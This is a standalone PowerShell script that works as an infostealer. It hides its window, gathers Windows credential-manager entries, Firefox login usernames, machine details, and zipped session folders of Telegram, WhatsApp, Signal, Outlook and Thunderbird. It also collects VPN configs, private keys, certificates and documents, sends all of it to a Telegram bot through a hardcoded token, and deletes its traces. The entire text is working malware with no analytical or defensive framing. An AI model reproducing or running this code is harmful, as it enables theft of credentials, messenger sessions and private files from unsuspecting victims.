$botToken = "8366406352:AAGExXi9CqgrlIQWESc-uqox-Sml23zkCI0"
$groupId = "-1003805783964"
$ext = @(".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".txt",".rtf",".odt",".ods",".odp",".csv",".jpg",".jpeg",".png",".gif",".tif",".tiff",".bmp",".zip",".rar",".7z", ".ovpn", ".p12", ".pfx", ".cer", ".key", ".pem")
$sourcePaths = @("C:\Users\MEGAPC\Desktop\1")
$tempBufferDir = Join-Path $env:TEMP "TG_Send_Buffer"
if (Test-Path $tempBufferDir) { Remove-Item $tempBufferDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempBufferDir | Out-Null

function Get-RandomDelay { return (Get-Random -Minimum 2000 -Maximum 4000) }

function Send-And-Delete {
    param([string]$MessageText = "", [string]$FilePath = $null)
    $sentSuccessfully = $false
    if ($FilePath -and (Test-Path -LiteralPath $FilePath)) {
        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
        $fileName = [System.IO.Path]::GetFileName($FilePath)
        try {
            $result = curl.exe -s -F "chat_id=$groupId" -F "caption=$MessageText" -F "document=@$FilePath" $uri
            if ($LASTEXITCODE -eq 0) {
                Write-Host "Sent & Deleted: $fileName" -ForegroundColor Green
                $sentSuccessfully = $true
                Remove-Item -LiteralPath $FilePath -Force -ErrorAction SilentlyContinue
            }
        } catch { }
    } elseif (-not $FilePath -and $MessageText) {
        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
        $body = @{ chat_id = $groupId; text = $MessageText; parse_mode = "Markdown" }
        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body $body | Out-Null
            Write-Host "Sent Msg: $($MessageText.Substring(0, [Math]::Min(50, $MessageText.Length)))..." -ForegroundColor Cyan
            $sentSuccessfully = $true
        } catch { }
    }
    if ($sentSuccessfully) {
        $delay = Get-RandomDelay
        Start-Sleep -Milliseconds $delay
    }
}

function Get-PCInfo {
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    try { $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like "1*" -or $_.IPAddress -like "10*" -or $_.IPAddress -like "192.*" } | Select-Object -First 1 -ExpandProperty IPAddress) } catch { $ip = "N/A" }
    if (-not $ip) { $ip = "N/A" }
    return "*PC Info:*$`n`n- Host: $($pcName)`n- User: $($userName)`n- OS: $($os)`n- IP: $($ip)"
}

[System.Diagnostics.Process]::GetCurrentProcess().PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); }
"@
$proc = Get-Process -Id $PID
if ($proc.MainWindowHandle -ne 0) { [Win32]::ShowWindow($proc.MainWindowHandle, 0) }

$pcInfo = Get-PCInfo
Send-And-Delete -MessageText "*START*$`n`n$pcInfo$`n`n*Collecting data...*"

$credsData = @()
try {
    $cmdOutput = cmd /c "cmdkey /list"
    $currentTarget = ""
    foreach ($line in $cmdOutput) {
        if ($line -match "Target:") { $currentTarget = $line.Split(':')[1].Trim() }
        if ($line -match "User:") { $user = $line.Split(':')[1].Trim(); $credsData += "$currentTarget | $user" }
    }
} catch {}

$firefoxPaths = Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
foreach ($profileDir in $firefoxPaths) {
    $jsonFile = Join-Path $profileDir.FullName "logins.json"
    if (Test-Path $jsonFile) {
        try {
            $json = Get-Content $jsonFile -Raw | ConvertFrom-Json
            if ($json.logins) { foreach ($login in $json.logins) { $credsData += "Firefox | $($login.hostname) | $($login.username)" } }
        } catch {}
    }
}
$credsFile = Join-Path $tempBufferDir "credentials_dump.txt"
if ($credsData.Count -gt 0) { $credsData | Out-File -FilePath $credsFile -Encoding UTF8; Send-And-Delete -MessageText "*Credentials Dump:*" -FilePath $credsFile }
else { Send-And-Delete -MessageText "*No credentials found (basic scan).*" }

$messengerPatterns = @("AppData\Roaming\Telegram Desktop\tdata","AppData\Roaming\WhatsApp","AppData\Local\WhatsApp","AppData\Roaming\Signal","AppData\Roaming\Microsoft\Outlook","AppData\Roaming\Thunderbird\Profiles")
foreach ($pattern in $messengerPatterns) {
    $fullPattern = "C:\Users\*\$pattern"
    $dirs = Get-ChildItem -Path $fullPattern -Directory -ErrorAction SilentlyContinue
    foreach ($dir in $dirs) {
        $baseName = Split-Path $dir.FullName -Leaf
        $zipName = Join-Path $tempBufferDir "Session_${baseName}_${env:USERNAME}.zip"
        try { Compress-Archive -Path $dir.FullName -DestinationPath $zipName -Force; Send-And-Delete -MessageText "*Session Archive:* $baseName" -FilePath $zipName } catch {}
        Start-Sleep -Milliseconds 300
    }
}

$configPatterns = @("*.ovpn", "*.p12", "*.pfx", "*.cer", "*.key", "*.pem")
$searchRoots = @("C:\Users", "C:\Program Files", "C:\ProgramData")
foreach ($root in $searchRoots) {
    if (Test-Path $root) {
        foreach ($pattern in $configPatterns) {
            $files = Get-ChildItem -Path $root -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue -ReadCount 50 | ForEach-Object { $_ }
            foreach ($file in $files) {
                $originalName = $file.Name
                $tempFile = Join-Path $tempBufferDir $originalName
                $counter = 1
                while (Test-Path $tempFile) {
                    $nameParts = $originalName.Split('.')
                    $extPart = $nameParts[-1]
                    $namePart = $nameParts[0..($nameParts.Length-2)] -join '.'
                    $originalName = "${namePart}_${counter}.${extPart}"
                    $tempFile = Join-Path $tempBufferDir $originalName
                    $counter++
                }
                try { Copy-Item -Path $file.FullName -Destination $tempFile -Force; Send-And-Delete -MessageText "*Config Found:* $($file.Name)`nPath: $($file.DirectoryName)" -FilePath $tempFile } catch {}
                Start-Sleep -Milliseconds 200
            }
        }
    }
}

$docBufferDir = Join-Path $tempBufferDir "Docs"
New-Item -ItemType Directory -Path $docBufferDir -Force | Out-Null
$sentFilesHash = @{}
foreach ($srcPath in $sourcePaths) {
    if (-not (Test-Path $srcPath)) { continue }
    $allFiles = Get-ChildItem -Path $srcPath -Recurse -File -Force -ErrorAction SilentlyContinue -ReadCount 100 | ForEach-Object { $_ }
    $files = $allFiles | Where-Object { $_.Extension.ToLower() -in $ext }
    foreach ($file in $files) {
        if ($sentFilesHash.ContainsKey($file.FullName)) { continue }
        if ($file.Length -gt 50MB) { $sentFilesHash[$file.FullName] = $true; continue }
        $originalName = $file.Name
        $tempFile = Join-Path $docBufferDir $originalName
        $counter = 1
        while (Test-Path $tempFile) {
            $nameParts = $originalName.Split('.')
            if ($nameParts.Count -gt 1) { $extPart = $nameParts[-1]; $namePart = $nameParts[0..($nameParts.Length-2)] -join '.'; $originalName = "${namePart}_${counter}.${extPart}" } else { $originalName = "${originalName}_${counter}" }
            $tempFile = Join-Path $docBufferDir $originalName
            $counter++
        }
        try { Copy-Item -Path $file.FullName -Destination $tempFile -Force; $sentFilesHash[$file.FullName] = $true } catch {}
        Start-Sleep -Milliseconds 150
    }
}

$bufferedFiles = Get-ChildItem -Path $docBufferDir -File -ErrorAction SilentlyContinue
foreach ($bufFile in $bufferedFiles) {
    if ([string]::IsNullOrWhiteSpace($bufFile.Name)) { continue }
    try { Send-And-Delete -MessageText "*Document:* $($bufFile.Name)" -FilePath $bufFile.FullName } catch { Start-Sleep -Milliseconds 1500 }
}

if (Test-Path $tempBufferDir) { Remove-Item $tempBufferDir -Recurse -Force -ErrorAction SilentlyContinue }
Send-And-Delete -MessageText "*FINISHED*$`n`n$pcInfo"
